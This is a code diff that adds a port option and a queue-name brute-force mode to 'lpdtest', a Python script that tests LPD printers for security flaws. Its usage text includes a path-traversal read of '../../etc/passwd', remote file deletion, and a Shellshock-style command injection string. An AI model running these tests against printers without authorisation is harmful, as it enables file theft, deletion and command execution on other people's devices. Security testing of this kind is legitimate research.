@@ -27,9 +27,13 @@
 #   to files in the spool dir by BSD 4.4 lpd); worth a shot
 
 # python standard library
-import sys, socket, argparse
+import sys, socket, argparse, time
 
 # ----------------------------------------------------------------------
+
+#TODO PRO bf printer name
+#TODO PRO port python3
+
 
 #
 def usage():
@@ -41,10 +45,12 @@ def usage():
   lpdtest printer put ../../etc/passwd
   lpdtest printer rm /some/file/on/printer
   lpdtest printer in '() {:;}; ping -c1 1.2.3.4'
-  lpdtest printer mail lpdtest@mailhost.local''',
+  lpdtest printer mail lpdtest@mailhost.local
+  lpdtest printer brute --port 1234 ''',
   formatter_class=argparse.RawDescriptionHelpFormatter)
   parser.add_argument("hostname", help="printer ip address or hostname")
-  parser.add_argument('mode', choices=['get', 'put', 'rm', 'in', 'mail'],
+  parser.add_argument("--port", type=int,    help="printer port",default=515)
+  parser.add_argument('mode', choices=['get', 'put', 'rm', 'in', 'mail','brute'],
                               help="select lpd proto security test")
   parser.add_argument('argument', help="specific to test, see examples")
 
@@ -65,17 +71,36 @@ def check_acknowledgement():
 	s.close()
 	sys.exit()
 
+
 # ----------------------------------------------------------------------
 
-# connect to printer
-s = socket.socket()
-s.connect((args.hostname, 515))
-
-# --------[ RFC 1179 | 5.2 02 - Receive a printer job ]-----------------
-
 queue = "lp" # see https://www.brooksnet.com/content/faq-lpd-queue-names-network-print-servers
-s.send("\002"+queue+"\n")
-check_acknowledgement()
+# queue = "text"
+
+def getFilequeueList(aFilename):
+  filequeueList=[]
+  try:
+    f = open(aFilename, 'r')
+    # filequeueList = f.readlines()
+        # Get next line from file
+    while True:
+      line = f.readline()
+  
+      # if line is empty
+      # end of file is reached
+      if not line:
+          break
+      # print("Line: {}", line.strip())
+      filequeueList.append(line.strip("\n"))
+ 
+    
+
+  except Exception as e:
+    print ("Error Open file: ",aFilename)
+  finally:
+    f.close()
+  return filequeueList
+
 
 # ----------------------------------------------------------------------
 
@@ -89,6 +114,7 @@ username  = "root"  # special user-name indicates a privileged user
 ctrlfile = "cfA001" # default name of control file
 datafile = "dfA001" # default name of data file
 getname  = datafile # default name of file to print
+bruteQueueNameFile = "printer.txt"  # default name of file to bruteforce Queue Name
 
 # --------[ Test scenarios: get, put, del, in, mail ]-------------------
 
@@ -120,6 +146,19 @@ elif args.mode == 'mail':
     sys.exit()
   print "[mail] Trying to send job information to " + args.argument
 
+elif args.mode == 'brute':
+  bruteQueueNameFile = args.argument
+  print "[brute] Trying to brute force queue file " + args.argument
+
+  # bruteforcequeue(): 
+  # try:
+  #   que = args.argument.split('@', 1)[0]
+  #   hostname = args.argument.split('@', 1)[1]
+  # except Exception as e:
+  #   print "Bad argument" + str(e)
+  #   sys.exit()
+  # print "[mail] Trying to send job information to " + args.argument  
+
 # --------[ RFC 1179 | 6.2 02 - Receive control file ]------------------
 
 if hostname:             ctrl += 'H'+ hostname+"\n" # [ RFC 1179 | 7.2 H  - Host name | max. 31 bytes ]
@@ -133,6 +172,45 @@ if jobtitle:             ctrl += 'T'+ jobtitle+"\n" # [ RFC 1179 | 7.10 T - Titl
 if srcfile:              ctrl += 'N'+  srcfile+"\n" # [ RFC 1179 | 7.7 N  - Name of source file | max. 131 bytes ]
 if jobtitle or srcfile:  ctrl += 'p'+  srcfile+"\n" # [ RFC 1179 | 7.25 p - Print file with 'pr' format | max. 131 bytes ]
 if getname:              ctrl += 'f'+  getname+"\n" # [ RFC 1179 | 7.22 l - Print file leaving control characters | max. 131 bytes ]
+
+
+# ----------------------------------------------------------------------
+
+# connect to printer
+s = socket.socket()
+s.connect((args.hostname, args.port))
+
+# --------[ RFC 1179 | 5.2 02 - Receive a printer job ]-----------------
+if args.mode == 'brute':
+  queueList=getFilequeueList(bruteQueueNameFile)
+  # s.settimeout(2) #Wait 2 sec
+  for queueName in queueList:
+    s.send("\002"+queueName+"\n")
+    #time.sleep(2)
+    
+    if s.recv(4096) != "\000":
+      # print "Negative acknowledgement"
+      s.send("\001\n") # [ RFC 1179 | 6.1 01 - Abort job ]
+      s.close()
+      #reopen for next attempt
+      s = socket.socket()
+      s.connect((args.hostname, args.port))
+      continue
+
+    else :
+      print "Printer found:",queueName
+      break
+   
+
+  s.close()
+  #sys.exit()
+  # check_acknowledgement()
+  # print queueList
+  sys.exit(1)
+  
+else:
+  s.send("\002"+queue+"\n")
+  check_acknowledgement()
 
 s.send("\002"+str(len(ctrl))+" "+ctrlfile+"\n")
 check_acknowledgement()
